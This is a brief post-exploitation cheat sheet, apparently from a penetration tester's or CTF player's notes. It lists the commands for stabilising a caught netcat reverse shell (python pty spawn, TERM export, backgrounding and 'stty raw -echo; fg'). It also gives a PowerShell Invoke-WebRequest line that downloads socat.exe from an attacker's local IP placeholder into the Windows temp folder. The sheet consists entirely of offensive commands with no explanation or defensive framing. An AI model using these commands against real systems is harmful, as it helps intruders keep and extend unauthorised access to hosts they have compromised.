--NetCat--
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm

Ctrl + Z
stty raw -echo; fg

IF SHELL DEAD: reset

--Socat--
Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
